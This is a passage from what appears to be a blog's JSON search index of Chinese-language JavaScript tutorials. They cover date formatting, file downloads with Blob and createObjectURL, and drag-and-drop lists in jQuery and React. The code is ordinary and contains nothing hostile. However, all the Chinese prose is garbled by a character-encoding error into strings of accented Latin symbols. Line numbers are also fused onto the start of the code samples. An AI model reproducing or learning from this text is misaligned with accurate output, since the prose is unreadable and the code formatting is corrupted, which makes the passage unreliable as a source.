Intl.DateTimeFormat('zh-TW').format(date)); ä¸‹åˆ7:59:34123const date = new Date()const result = date.toLocaleTimeString()console.log(result)","link":"/2022/04/01/javascript-date-formate/"},{"title":"JavaScriptï¼å¯¦ä½œä¸‹è¼‰æª”æ¡ˆçš„æ–¹å¼","text":"è¶æ—©å¡«å‘ã€‚ ç°¡è¿°åœ¨å¯¦éš›ä»‹ç´¹ä¸‹è¼‰æª”æ¡ˆçš„æ–¹æ³•å‰ï¼Œæˆ‘è¦ºå¾—å…ˆèªè­˜åº•ä¸‹å¹¾å€‹æ±è¥¿æœƒæ¯”è¼ƒå¥½ä¸Šæ‰‹ï¼š &lt;input type=\"file\"&gt; çš„ä½¿ç”¨æ–¹å¼ window.URL.createObjectURL çš„ç”¨æ³• Blob è³‡æ–™æ ¼å¼å’Œè½‰æ›æ ¼å¼çš„è§€å¿µ çœ‹å®Œå¾Œä½ å°±æœƒè¦ºå¾—ä¸‹è¼‰æª”æ¡ˆä¸¦æ²’æœ‰æƒ³åƒä¸­é‚£éº¼å›°é›£å›‰ã€‚ å…ˆå¾ HTML æ¨™ç±¤é–‹å§‹è¦è®“ä½¿ç”¨è€…ä¸Šå‚³æª”æ¡ˆçš„è©±åŸºæœ¬ä¸Šéƒ½æœƒé€é &lt;input type=\"file\"&gt; ä¾†å¯¦ä½œï¼Œä»–çš„åŸºæœ¬ç”¨æ³•æ˜¯åƒé€™æ¨£ï¼š 1&lt;input type=\"file\" multiple accept=\"image/*\" /&gt; 123document.querySelector('input').addEventListener('change', function () { console.log(this.files)}) è¼¸å‡ºçµæœï¼š æ‡¶äººåŒ…ï¼š input å¯ä»¥ç”¨ä¾†è®“ä½¿ç”¨è€…ä¸Šå‚³æª”æ¡ˆï¼Œä¾æ“šéœ€æ±‚å¯ä»¥æ·»åŠ  multiple ä¾†æ±ºå®šä½¿å¦èƒ½å¤šé¸ï¼Ÿaccept æ±ºå®šåªèƒ½é¸æ“‡å“ªäº› MIME é¡å‹çš„æª”æ¡ˆ input ç¯€é»æœƒæœ‰ files é€™å€‹å±¬æ€§ï¼Œå°±æ˜¯ File ç‰©ä»¶ï¼ˆå„²å­˜æª”æ¡ˆçš„è³‡è¨Šï¼‰ createObjectURLä»–æ˜¯ä¸€å€‹ HTML5 çš„ APIï¼Œæˆ‘å€‘å…ˆä¾†çœ‹å®ƒåœ¨æ–‡ä»¶ä¸Šçš„å®šç¾©ï¼š Object URL is a URL representing a object. The URL lifetime is tied to the document in the window on which it was created. The new object URL represents the specified File object or Blob object. â€” MDN ç°¡å–®ä¾†èªªä»–æ˜¯ç”¨ä¾†ã€Œå»ºç«‹ URL çš„ä¸€å€‹ç‰©ä»¶ã€ï¼Œä½†é€™å€‹ç‰©ä»¶çš„å€¼å¿…é ˆæ˜¯ã€ŒFileã€æˆ–æ˜¯ã€ŒBlobã€ã€‚ File å¯ä»¥é€é &lt;input type=\"file\"&gt; ä¸Šçš„ files å±¬æ€§ä¾†å–å¾—ï¼Œè€Œ Blob å‰‡æ˜¯ä¸€ç¨®è³‡æ–™æ ¼å¼ã€‚å¦‚æœç›®å‰ä¸å¤ªæ‡‚é€™å…©å€‹æ±è¥¿ä¹Ÿæ²’é—œä¿‚ï¼Œå¾Œé¢æœƒå†è§£é‡‹ï¼Œåªè¦å…ˆè¨˜å¾—ä¸‹é¢é€™å€‹åŸå‰‡å°±å¥½ï¼š è¼¸å…¥ï¼šFile / Blob è¼¸å‡ºï¼šURL é‡é»åœ¨æ–¼è¼¸å‡ºURLï¼Œå› ç‚ºæ˜¯ URL çš„é—œä¿‚ï¼Œæ‰€ä»¥åªè¦æ˜¯ä»»ä½•ä½¿ç”¨ URL çš„æ¨™ç±¤éƒ½å¯ä»¥æ‹¿ä¾†ç”¨ï¼Œåƒæ˜¯ &lt;img&gt; å’Œ &lt;a&gt;ï¼ˆé€šå¸¸æ˜¯æ‹¿ä¾†åšä¸‹è¼‰åŠŸèƒ½ï¼‰ã€‚ é€™é‚Šæœ‰ä¸€å€‹å¾ˆç¶“å…¸çš„ä¾‹å­ï¼šå¦‚æœæˆ‘æƒ³å¯¦ä½œé è¦½åœ–ç‰‡çš„åŠŸèƒ½æ€éº¼åšï¼Ÿé€™å¾ˆå¸¸å‡ºç¾åœ¨ã€Œæ›é ­åƒã€çš„æ™‚å€™ã€‚ é †é“ä¸€æé€™ç¨®ä½œæ³•æ˜¯æœ‰å¥½è™•çš„ï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡ï¼šHTML5 ç¥å¥‡çš„ Object URLï¼šä¸ç”¨å¾Œç«¯ï¼Œå‰ç«¯ä¾¿èƒ½ç”¢ç”Ÿç²å–æŒ‡å®šç‰©ä»¶çš„ç¶²å€ åªè¦é€é createObjectURL å¯ä»¥å¾ˆè¼•é¬†çš„åšåˆ°é€™ä»¶äº‹ï¼š 123&lt;div class=\"container mt-5\"&gt; &lt;input type=\"file\" accept=\"image/*\" /&gt;&lt;/div&gt; 123456789101112131415161718document.querySelector('input').addEventListener('change', function () { // reset screen document.querySelector('p')?.remove() document.querySelector('img')?.remove() // show message when no file selected if (this.files.length === 0) { const p = document.createElement('p') p.innerText = 'Not select any files' document.querySelector('.container').append(p) return } // show preview img const img = document.createElement('img') const url = window.URL.createObjectURL(this.files[0]) img.src = url img.classList.add('img') document.querySelector('.container').append(img)}) å¯¦éš›ç¯„ä¾‹å¯ä»¥åƒè€ƒé€™è£¡ã€‚ é—œæ–¼ Blob èˆ‡ FileBlob å…¶å¯¦å°±æ˜¯ä¸€ç¨®ã€Œè³‡æ–™æ ¼å¼ã€ï¼ŒBlob æ˜¯ç¸®å¯«ï¼Œå…¨åç‚ºã€ŒBinary Large Objectï¼ˆäºŒé€²ä½å¤§å‹ç‰©ä»¶ï¼‰ã€ï¼Œè€Œ File æ˜¯åŸºæ–¼ Blob ä¾†è£½ä½œçš„å¦ä¸€ç¨®è³‡æ–™æ ¼å¼ï¼Œæ‰€ä»¥æœ¬è³ªä¸Šæ˜¯å·®ä¸å¤šçš„æ±è¥¿ã€‚ é€™å°±è·Ÿ JSON æ˜¯ä¸€æ¨£çš„é“ç†ï¼Œå…©å€‹éƒ½åªæ˜¯ç”¨ä¾†è¡¨ç¤ºè³‡æ–™çš„ä¸€ç¨®ã€Œæ ¼å¼ã€ï¼Œä¸ç”¨æƒ³å¾—å¤ªè¤‡é›œã€‚ ä¸éæˆ‘å€‘éƒ½çŸ¥é“ç¢°åˆ° JSON æ™‚æˆ‘å€‘è¦ç”¨ JSON.parse ä¾†è§£æï¼Œé‚£ Blob å‘¢ï¼Ÿ é€™é‚Šè¦å…ˆèªªä¸€å€‹é‡è¦è§€å¿µï¼š JS æœ¬èº«å°±æ˜¯åªèƒ½æ“ä½œ JavaScriptï¼Œè€Œ Blob æ²’è¾¦æ³•åƒ JSON ä¸€æ¨£å¯ä»¥è½‰æ›æˆ JavaScriptï¼Œæ‰€ä»¥ä½ æ˜¯æ²’è¾¦æ³•ç›´æ¥ç”¨ JS ä¾†æ“ä½œ Blob çš„ã€‚ ä½ å”¯ä¸€èƒ½åšçš„å°±æ˜¯é€é Blob ä¾†ç”¢ç”Ÿä¸€æ®µ urlï¼Œæ¥è‘—å†ç¶åˆ°å°æ‡‰çš„ HTML æ¨™ç±¤ä¸Šä¾†åšè™•ç†ï¼ˆä¸‹è¼‰ or é¡¯ç¤ºå…§å®¹ï¼‰ï¼Œç•¢ç«Ÿ blob çš„ç”¨é€”ä¸»è¦å°±æ˜¯æ‹¿ä¾†è™•ç†æª”æ¡ˆã€‚ æ‰€ä»¥é€™é‚Šå…ˆè¬›æ­¥é©Ÿï¼Œå¾…æœƒå†ä¾†ç¤ºç¯„ï¼š å»ºç«‹ Blob ç‰©ä»¶ é€é createObjectURL ä¾†å»ºç«‹ä¸€å€‹å±¬æ–¼ blob çš„ URL æŠŠ URL ç¶åˆ°ç›¸é—œçš„ HTML æ¨™ç±¤ä¸Š é€™é‚Šæˆ‘è¦ç¤ºç¯„çš„æ˜¯æŠŠä¸€ä»½ JSON è³‡æ–™è½‰æˆ Blobï¼Œæ¥è‘—å†æŠŠé€™å€‹ Blob è½‰æˆé€£çµä¾†æ‰“é–‹å®ƒï¼š 12345678910const jsonData = JSON.stringify({ hello: 'blob' }, null, 2)// 1. create blobconst jsonBlob = new Blob([jsonData], { type: 'application/json' })// 2. create urlconst url = window.URL.createObjectURL(jsonBlob)// 3. bind to domconst a = document.createElement('a')a.href = urla.innerText = 'JSON'document.body.append(a) é™„è¨»ï¼šå¯¦éš›ç¤ºç¯„å¯ä»¥åƒè€ƒé€™é‚Š è£œå……ä¸€ä¸‹ new Blob çš„éƒ¨åˆ†ï¼š ç°¡å–®ä¾†èªªä»–æœƒæ¥æ”¶å…©å€‹åƒæ•¸ï¼Œç¬¬ä¸€å€‹æ˜¯ã€Œä½ è¦è½‰æ›çš„è³‡æ–™ï¼ˆå¿…é ˆæ”¾åœ¨é™£åˆ—è£¡ï¼‰ã€ï¼Œç¬¬äºŒå€‹å‰‡æ˜¯ã€ŒMIME Typeï¼ˆç°¡å–®ä¾†èªªå°±æ˜¯æª”æ¡ˆé¡å‹å•¦ï¼‰ã€ï¼Œæ‰€ä»¥ new Blob([jsonData], { type: 'application/json' }) çš„æ„æ€å°±æ˜¯ï¼š [jsonData] = è¦è½‰æ›çš„è³‡æ–™ { type: 'application/json' } = MIME type è‡³æ–¼è©³ç´°çš„ MIME åˆ—è¡¨å¯ä»¥åƒè€ƒ MDN å¯¦ä½œä¸‹è¼‰æª”æ¡ˆå…¶å¯¦ä¸»è¦çš„æ¦‚å¿µå°±æ˜¯å‰é¢èªªçš„ new Blob å’Œ createObjectURL ï¼Œæ‰€ä»¥é€™é‚Šå°±ç›´æ¥é™„ä¸Š codeï¼š ï¼ˆé€™é‚Šæ˜¯é€é API ä¾†å–å¾—å°æ‡‰çš„ Excel æª”æ¡ˆï¼‰ 123456789101112131415161718api .exportFile(requestData) .then((response: any) =&gt; { // æª”æ¡ˆåç¨± const fileName = response.headers['content-disposition'].split('filename=')[1] const blob = new Blob([response.data], { type: response.headers['content-type'] }) const url = window.URL.createObjectURL(blob) const link = document.createElement('a') link.href = url link.setAttribute('download', fileName) document.body.appendChild(link) // dowload link.click() link.remove() }) .catch((error: any) =&gt; { Notification('error', error.message) }) é€™æ®µçš„èƒŒå¾Œå…¶å¯¦åªæ˜¯æŠŠ blob ç”¢ç”Ÿçš„ç¶²å€æ‹¿ä¾†å¯«å…¥é€™æ®µ HTML å¾Œå†å¹«ä½ è‡ªå‹•é»æ“Šï¼š 1234&lt;a href=\"blob:http://localhost:2051/4db51291-7057-4975-a6d5-727d0084c093\" download=\"IR_Export_20220719113912.xlsx\"&gt;&lt;/a&gt; é™„è¨»ï¼šç•¶ &lt;a&gt; æœ‰ dowload å±¬æ€§æ™‚å°±ç­‰æ–¼ä¸‹è¼‰æª”æ¡ˆ æ‰€ä»¥ä¸‹è¼‰æª”æ¡ˆçš„å¯¦ä½œé‚„è »å–®ç´”çš„ï¼Œåªè¦ææ¸…æ¥šè³‡æ–™æ ¼å¼æ€éº¼è½‰æ›å°±å¥½äº†ã€‚é †é“ä¸€æï¼Œå¦‚æœæª”æ¡ˆæ˜¯é€é AJAX ä¾†å–å¾—çš„è©±ï¼Œè«‹å‹™å¿…ï¼š åœ¨ header åŠ ä¸Š responseType = 'blob' åœ¨ header åŠ ä¸Š responseType = 'blob' åœ¨ header åŠ ä¸Š responseType = 'blob' é€™æ¨£å­æ‰æœƒæŠŠ response è½‰æˆ blob çš„å½¢å¼ã€‚çœ‹å¾ˆå¤šäººéƒ½è¢«é€™å€‹é›·åˆ°ï¼Œæ‰€ä»¥ç‰¹åˆ¥å¼·èª¿ä¸€ä¸‹ã€‚","link":"/2022/07/22/javascript-dowload-feature/"},{"title":"JavaScriptï¼å¦‚ä½•æ“ä½œå¯æ‹–æ›³çš„å…ƒç´ ","text":"æ–°çš„é…·æ±æ±ã€‚ ç°¡è¿°æ‹–æ›³å¯ä»¥æ‡‰ç”¨çš„å ´æ™¯æœ‰å¾ˆå¤šï¼Œåƒæ˜¯ï¼š ç”¨æ‹–æ‹‰çš„æ–¹å¼ä¾†ä¸Šå‚³æª”æ¡ˆ ç”¨æ‹–æ‹‰çš„æ–¹å¼ä¾†äº¤æ›å…ƒç´ ä½ç½® æŠŠæ±è¥¿å¾ A æ‹–æ‹‰åˆ° B é»ï¼ˆä¾‹å¦‚é©—è­‰ or åœ–å½¢ä»‹é¢ï¼‰ æ‰€ä»¥è¦ºå¾—é€™é‚„è »å€¼å¾—å­¸çš„ï¼Œå¯ä»¥é‹ç”¨çš„åœ°æ–¹æœ‰å¾ˆå¤šã€‚ é¦–å…ˆä¾†ä¸€å€‹ MDN çš„ç¯„ä¾‹ï¼Œæˆ‘å€‘è¦åšçš„æ˜¯åƒé€™æ¨£çš„æ•ˆæœï¼š å¦‚æœä½ æƒ³ç›´æ¥çœ‹åŸå§‹ç¢¼çš„è©±å¯ä»¥åˆ° Codepen ä¸Šçœ‹ï¼Œæ¥ä¸‹ä¾†æœƒé€æ­¥ä»‹ç´¹ç›¸é—œçš„ API å’Œæ€è·¯ã€‚ é€™é‚Šå…ˆè£œå……ä¸€å€‹æ¦‚å¿µï¼Œå¦‚æœè¦è®“ä¸€å€‹å…ƒç´ æ˜¯ã€Œdraggableï¼ˆå¯æ‹–æ›³ï¼‰ã€ çš„è©±ï¼Œè¦åŠ ä¸Š draggable=\"true\" é€™å€‹å±¬æ€§ï¼š 1&lt;div class=\"ball\" draggable=\"true\"&gt;&lt;/div&gt; å¦‚æœæ²’æœ‰åŠ çš„è©±é è¨­éƒ½æ˜¯ç„¡æ³•æ‹–æ›³çš„ï¼Œæ‰€ä»¥ä¸€å®šè¦è¨˜å¾—å“¦ã€‚ æ¥è‘—ä¾†è§£é‡‹é€™é‚Šç”¨åˆ°çš„ APIï¼Œç¸½å…±æœ‰ä¸‰å€‹ï¼š dragstart dragover drop dragstart ç•¶å…ƒç´ é–‹å§‹è¢«æ‹–æ›³çš„æ™‚å€™æœƒè§¸ç™¼ã€‚ é€™é‚Šæ˜¯åˆ©ç”¨äº†é€™å€‹ function ä¾†å–å¾—ã€Œç›®å‰æ‹–æ›³çš„å…ƒç´ æ˜¯èª°ã€ï¼š 1234let dragItem = nulldocument.addEventListener('dragstart', (e) =&gt; { dragItem = e.target}) ä¹‹æ‰€ä»¥è¦å­˜èµ·ä¾†æ˜¯å› ç‚ºæˆ‘å€‘å¸Œæœ›åœ¨ã€ŒæŸå€‹æ™‚æ©Ÿé»ã€æŠŠå®ƒæ’åˆ°å…¶ä»– DOM å…ƒç´ ä¸Šï¼Œæ‰€ä»¥æ‰éœ€è¦é€™å€‹ referenceã€‚ dragover ç•¶æœ‰ã€Œdraggableï¼ˆå…ƒç´  / æª”æ¡ˆï¼‰ã€çš„æ±è¥¿è¢«æ‹–æ›³é€²ä¾†æ™‚è§¸ç™¼ï¼Œè€Œä¸”æ˜¯é€£çºŒè§¸ç™¼ã€‚ é€™é‚Šé€šå¸¸å¯ä»¥åš dragging çš„é†’ç›®æ•ˆæœï¼Œä¸éæ›´é‡è¦çš„æ˜¯ e.preventDefaultï¼Œå› ç‚ºå®ƒå¯ä»¥ï¼š è®“å…ƒç´ å¾ã€Œä¸èƒ½è¢« dropã€è®Šæˆã€Œå¯ä»¥è¢« dropã€çš„ç‹€æ…‹ã€‚ è®“å…ƒç´ å¾ã€Œä¸èƒ½è¢« dropã€è®Šæˆã€Œå¯ä»¥è¢« dropã€çš„ç‹€æ…‹ã€‚ è®“å…ƒç´ å¾ã€Œä¸èƒ½è¢« dropã€è®Šæˆã€Œå¯ä»¥è¢« dropã€çš„ç‹€æ…‹ã€‚ ä»¥ç›®å‰çš„ç¯„ä¾‹ä¾†èªªä¸æ˜¯å¾ˆå¥½æ‡‚ï¼Œæ‰€ä»¥é€™é‚Šæœƒç”¨å¦ä¸€å€‹ç¯„ä¾‹è§£é‡‹ã€‚ è¦çœ‹ä¸€å€‹å…ƒç´ æ˜¯å¦èƒ½ drop å¯ä»¥å¾ cursor æœ‰æ²’æœ‰é¡¯ç¤º + è™Ÿ ä¾†åˆ¤æ–·ï¼Œåƒé€™æ¨£ï¼š ç°è‰²å€å¡Šå› ç‚ºæœ‰åŠ ä¸Š e.preventDefaultï¼Œæ‰€ä»¥ç•¶å®ƒè¢«ç´…çƒ dragover æ™‚å°±æœƒé¡¯ç¤º + è™Ÿï¼Œä»£è¡¨é€™è£¡æ˜¯å¯ä»¥ drop çš„ã€‚ è©³ç´°å¯ä»¥è‡ªå·±åˆ° Codepen ä¸Šç©ç©çœ‹ã€‚ drop ç•¶ã€Œdraggableï¼ˆå…ƒç´  / æª”æ¡ˆï¼‰ã€çš„æ±è¥¿æ”¾æ‰çš„æ™‚å€™è§¸ç™¼ã€‚ å›åˆ°åŸæœ¬çš„ä¾‹å­ï¼Œæˆ‘å€‘å¸Œæœ›åœ¨ã€Œç´…çƒæ”¾æ‰çš„æ™‚å€™ã€ä¾†æ›´æ–°ä»–çš„ä½ç½®ï¼Œæ‰€ä»¥å¯«äº†é€™æ¨£çš„åˆ¤æ–·ï¼š 12345678910111213document.addEventListener('drop', (e) =&gt; { // åœç”¨é è¨­çš„ download è¡Œç‚ºï¼ˆé‡è¦ï¼‰ e.preventDefault() // drop åˆ°çš„é‚£å€‹å…ƒç´  const targetElement = e.target // åˆ¤æ–· target æ˜¯å¦æ­£ç¢º if (targetElement.classList.contains('dropzone')) { // ç§»é™¤ dragItem.parentNode.removeChild(dragItem) // æ’å…¥ e.target.append(dragItem) }}) ç°¡å–®ä¾†èªªåªè¦ç´…çƒ drop çš„å…ƒç´ æœ‰ dropzone é€™å€‹ calss å°±æœƒã€Œæ›´æ–°ä½ç½®ã€ï¼Œæ‰€ä»¥å¤§è‡´çš„æ€è·¯å°±æ˜¯é€™æ¨£ã€‚ ä¸éé€™é‚Šæƒ³ç‰¹åˆ¥æä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯è¦æ³¨æ„ã€Œ addEventListener æ˜¯ç¶åœ¨èª°èº«ä¸Šï¼Ÿã€ æœƒæé€™å€‹æ˜¯å› ç‚ºç•¶ã€Œç¶å®šçš„å°è±¡ä¸åŒæ™‚æ€è·¯ä¹Ÿæœƒä¸åŒã€ã€‚ä»¥å‰›å‰›çš„ç¯„ä¾‹ä¾†çœ‹éƒ½éƒ½æ˜¯ç¶åœ¨ document èº«ä¸Šï¼Œæ‰€ä»¥åƒæ˜¯ drop ä¸ç®¡æ˜¯åœ¨å“ªè£¡ç™¼ç”Ÿçš„éƒ½æœƒè¢«è§¸ç™¼ã€‚ å¯æ˜¯å¦‚æœç¾åœ¨ addEventListener æ˜¯æ›åœ¨ .target èº«ä¸Šçš„è©±å°±ä¸ä¸€æ¨£äº†ï¼Œé€™æ¨£å°±åªæœ‰åœ¨ã€Œæ±è¥¿è¢« drop åˆ°å®ƒèº«ä¸Šæ™‚ã€æ‰æœƒè§¸ç™¼é€™å€‹äº‹ä»¶ï¼ˆæœ‰é»åƒæ˜¯ç¬¬ä¸€äººç¨±è·Ÿç¬¬ä¸‰äººç¨±çš„å·®åˆ¥ï¼‰ï¼Œé€™ä¸€æ®µå¦‚æœä¸æ‡‚çš„è©±å»ºè­°è‡ªå·±å¤šå¯«å¹¾å€‹ç¯„ä¾‹ä¾†ç©ç©çœ‹ï¼Œæ‡‰è©²æ¯”è¼ƒèƒ½é«”æœƒæˆ‘æƒ³è¡¨é”çš„æ„æ€ã€‚ è£½ä½œå¯æ‹–æ›³çš„åˆ—è¡¨ é€™å€‹ç®—æ˜¯è »å¸¸è¦‹çš„éœ€æ±‚ï¼Œæ‰€ä»¥èƒ½ç·´ç¿’ä¸€ä¸‹ã€‚è‡³æ–¼æ€è·¯éƒ½å¯«åœ¨è¨»è§£ä¸­äº†ï¼Œä¸æ‡‚çš„è©±è©¦è‘—è‡ªå·±åšåšçœ‹å°±æ‡‚äº†ã€‚ å¯èƒ½æœƒæ¯”è¼ƒæœ‰ç–‘å•çš„åœ°æ–¹æ‡‰è©²æ˜¯ e.dataTransfer çš„éƒ¨åˆ†ï¼Œé€™è£¡ç¨å¾®è§£é‡‹ä¸€ä¸‹ã€‚ç°¡å–®ä¾†èªªå°±æ˜¯è®“ä½ ã€Œå¹«è¢«æ‹–æ›³çš„å…ƒç´ å„²å­˜è³‡è¨Šã€ï¼Œé€™æ¨£å­åœ¨åšåˆ¤æ–·æ™‚æ‰æœ‰ç›¸é—œçš„ referenceï¼Œè©³ç´°çš„ç”¨æ³•å¯ä»¥åƒè€ƒ MDNï¼Œæˆ–é€™ç¯‡ æ–‡ç«  JavaScript + jQuery123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;body&gt; &lt;ul class=\"list\"&gt; &lt;li&gt;One&lt;/li&gt; &lt;li&gt;Two&lt;/li&gt; &lt;li&gt;Three&lt;/li&gt; &lt;li&gt;Four&lt;/li&gt; &lt;/ul&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js\"&gt;&lt;/script&gt; &lt;script&gt; // å–å¾—æ‰€æœ‰ li const items = document.querySelectorAll('li') // è¨­å®š property å’Œ listener items.forEach((li) =&gt; { $(li).prop('draggable', true) li.addEventListener('dragstart', dragStart) li.addEventListener('drop', dropped) li.addEventListener('dragover', (e) =&gt; e.preventDefault()) }) function dragStart(e) { // å–å¾— index const index = $(e.target).index() // è¨­å®šè¢«æ‹–æ›³å…ƒç´ çš„è³‡è¨Šï¼Œä¹‹å¾Œå¯é€é getData() ä¾†å–å¾— e.dataTransfer.setData('text/plain', index) } function dropped(e) { e.preventDefault() // è¨˜å¾—è½‰æˆæ•¸å­— const oldIndex = parseInt(e.dataTransfer.getData('text/plain'), 10) const target = $(e.target) const newIndex = $(e.target).index() // remove orignal element // 1. æ‰¾åˆ° parent // 2. æŠŠç¬¬ oldIndex å€‹ child çµ¦ç§»é™¤ // 3. æŠŠå›å‚³å€¼å„²å­˜ï¼ˆè¢«åˆªé™¤çš„å…ƒç´ ï¼‰ const dropped = $(this).parent().children().eq(oldIndex).remove() // æ–°ä½ç½®ï¼ˆç›®æ¨™ï¼‰æ¯”åŸæœ¬é‚„å¾Œé¢å°±æ’åˆ°ä»–ï¼ˆæ–°ä½ç½®ï¼‰å¾Œé¢ï¼Œä»¥æ­¤é¡æ¨ oldIndex &lt; newIndex ? target.after(dropped) : target.before(dropped) } &lt;/script&gt;&lt;/body&gt; åŸå§‹ç¢¼å¯åˆ° CodePen åƒè€ƒã€‚ å…¶å¯¦æœ€é—œéµçš„åœ°æ–¹å°±æ˜¯ dragStart æ™‚å„²å­˜ã€ŒåŸå§‹ä½ç½®ã€ï¼Œæ¥è‘— dropped æ™‚å–å¾—ã€Œæ–°çš„ä½ç½®ã€ï¼Œæœ€å¾Œå†æ ¹æ“šã€Œæ–° / èˆŠä½ç½®ã€ä¾†åˆ¤æ–·è¦æ”¾åˆ°é‚£å€‹ä½ç½®ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯é€™æ¨£å§ã€‚ React1234567891011121314151617181920212223242526272829303132export default function App() { const [items, setItems] = useState(['One', 'Two', 'Three', 'Four']) return ( &lt;ul className='list'&gt; {items.map((item, index) =&gt; ( &lt;li draggable='true' key={item} onDragOver={(e) =&gt; e.preventDefault()} onDragStart={(e) =&gt; { // å„²å­˜ drag æ™‚çš„ä½ç½® e.dataTransfer.setData('text/plain', index) }} onDrop={(e) =&gt; { const oldIndex = parseInt(e.dataTransfer.getData('text/plain'), 10) // drop çš„ä½ç½® let targetIndex = index const newItems = [...items] // remove the old one const removedItem = newItems.splice(oldIndex, 1) // insert to target index newItems.splice(targetIndex, 0, ...removedItem) setItems(newItems) }} &gt; {item} &lt;/li&gt; ))} &lt;/ul&gt; )} åŸå§‹ç¢¼å¯åˆ° CodePen ä¾†çœ‹ã€‚ React ç›¸å°ä¾†èªªæœƒç›´è¦ºä¸€äº›ï¼Œç•¢ç«Ÿåªè¦å°ˆæ³¨åœ¨ã€Œè³‡æ–™ã€å°±å¥½ï¼Œä¸éè¦ç•™æ„ä¸€ä¸‹ splice çš„éƒ¨åˆ†ã€‚ç¬¬ä¸€å€‹åƒæ•¸å¯ä»¥æƒ³æˆæ˜¯ã€Œæˆ‘å¸Œæœ›å…ƒç´ æ”¾åˆ°çš„ä½ç½®ã€ï¼Œé€™æ¨£å­æœƒæ¯”è¼ƒå¥½ç†è§£ä¸€é»ã€‚ ä¾‹å¦‚èªªæˆ‘æƒ³æŠŠæŸå€‹å…ƒç´ æ”¾åˆ°ç¬¬ä¸€å€‹ä½ç½®ï¼Œé‚£å°±æœƒç”¨ splice(0, 0, item)ï¼Œç¬¬äºŒå€‹çš„è©±å°±æ˜¯ splice(1, 0, item)ï¼Œä»¥æ­¤é¡æ¨ã€‚å°±ä¸ç”¨åƒå¯« jQuery æ™‚é‚„è¦å¤šåˆ¤æ–·ã€Œæ’åˆ°å‰é¢é‚„æ˜¯å¾Œé¢ã€çš„é€™ä¸€æ­¥ã€‚ å¯æ‹–æ›³æª”æ¡ˆï¼ˆReactï¼‰åšå®Œä¸Šé¢çš„ç·´ç¿’å¾Œæ‡‰è©²å°±èƒ½åšå‡ºé€™æ¨£çš„åŠŸèƒ½ï¼š åŸå§‹ç¢¼å¯åˆ° CodePen åƒè€ƒ ä¸»è¦åªæ˜¯å¤šäº†ã€Œä¸Šå‚³æª”æ¡ˆã€çš„åŠŸèƒ½ï¼ŒèƒŒå¾Œçš„æ‹–æ›³é‚è¼¯å…¶å¯¦éƒ½è·Ÿå‰›å‰›å·®ä¸å¤šï¼Œæ‰€ä»¥é€™é‚Šå°±ç›´æ¥é™„ä¸Š code ä¸è§£é‡‹å¤ªå¤šäº†ï¼Œå¯ä»¥åƒè€ƒè¨»è§£é‚Šç·´ç¿’çœ‹çœ‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485export default function App() { const [uploadFiles, setUploadFiles] = useState([]) return ( &lt;&gt; &lt;div className='upload'&gt; &lt;p className='upload-title'&gt;Link path&lt;/p&gt; &lt;div className='upload-area' // allow drop onDragOver={(e) =&gt; e.preventDefault()} // receive file (æ‹–æ›³é€²ä¾†çš„æª”æ¡ˆ) onDrop={(e) =&gt; { // prevent dowload e.preventDefault() if (e.dataTransfer.files.length &gt; 0) { setUploadFiles(Array.from(e.dataTransfer.files)) } }} &gt; &lt;div className='upload-area-list'&gt; &lt;ul className='list'&gt; {uploadFiles.map((file, index) =&gt; ( &lt;li draggable='true' key={file.name} onDragOver={(e) =&gt; { // allow drop e.preventDefault() // stop bubbling to parent (.upload-area) e.stopPropagation() }} onDragStart={(e) =&gt; e.dataTransfer.setData('text/plain', index)} onDrop={(e) =&gt; { // prevent dowload e.preventDefault() // stop bubbling to parent (.upload-area) e.stopPropagation() const oldIndex = parseInt(e.dataTransfer.getData('text/plain'), 10) // é¿å…å¾æ¡Œé¢æ‹–æ›³æª”æ¡ˆåˆ° li ä¸Šçš„æƒ…æ³ if (!isNaN(oldIndex)) { let targetIndex = index // å› ç‚ºæ˜¯ blob æ‰€ä»¥å¾—ç”¨é€™ç¨®æ–¹å¼ copy const newFiles = uploadFiles.map((file) =&gt; new File([file], file.name)) const removedBackup = newFiles[oldIndex] // remove the old one newFiles.splice(oldIndex, 1) // insert to target index newFiles.splice(targetIndex, 0, removedBackup) setUploadFiles(newFiles) } }} &gt; &lt;span className='file-name'&gt; 0{index + 1}. {file.name} &lt;/span&gt; &lt;span onClick={() =&gt; setUploadFiles((prev) =&gt; prev.filter((f) =&gt; f.name !== file.name)) } className='material-icons material-icons-close' &gt; close &lt;/span&gt; &lt;/li&gt; ))} &lt;/ul&gt; &lt;/div&gt; &lt;button className='upload-area-button'&gt; &lt;span className='material-icons'&gt;file_upload&lt;/span&gt; &lt;input type='file' multiple onChange={(e) =&gt; setUploadFiles(Array.from(e.target.files))} /&gt; &lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;button className='btn-save' onClick={() =&gt; console.log(uploadFiles)}&gt; Save &lt;/button&gt; &lt;/&gt; )} é€™é‚Šè¦ç‰¹åˆ¥æ³¨æ„ e.stopPropagation çš„åŠŸèƒ½ï¼Œå¦‚æœæ²’æœ‰åœ¨è©²åŠ çš„åœ°æ–¹åŠ ä¸Šçš„è©±å°±æœ‰å¯èƒ½é‡åˆ°ã€Œäº‹ä»¶å¾ children å†’æ³¡åˆ° parentã€çš„å•é¡Œã€‚ åƒæ˜¯å‡è¨­æˆ‘åœ¨ &lt;li&gt; è§¸ç™¼äº† drop äº‹ä»¶ï¼Œæ²’æœ‰å–æ¶ˆå‚³éçš„è©±å°±æœƒå†’æ³¡åˆ° .upload-area çš„ä½ç½®ä¸Šï¼Œæ‰€ä»¥å°±æœƒè®Šæˆé€™æ¨£ï¼š åŸ·è¡Œ li çš„ event callbackï¼ŒæŠŠä½ç½®äº¤æ› åŸ·è¡Œ .upload-area çš„ event callbackï¼Œæ›´æ–° state é€™å°±è·Ÿæˆ‘å€‘é æœŸçš„ä¸ä¸€æ¨£äº†ï¼Œæˆ‘å€‘åªå¸Œæœ›li çš„ callback è¢«åŸ·è¡Œè€Œå·²ã€‚ æ‰€ä»¥é€™é‚Šè¦ç‰¹åˆ¥ç•™æ„äº‹ä»¶å‚³éæ©Ÿåˆ¶çš„å•é¡Œï¼Œä¸ç†Ÿçš„è©±å¯ä»¥åƒè€ƒæˆ‘å¯«çš„ é˜»æ­¢äº‹ä»¶å‚³é stopPropagationã€‚ é›–ç„¶ä½ 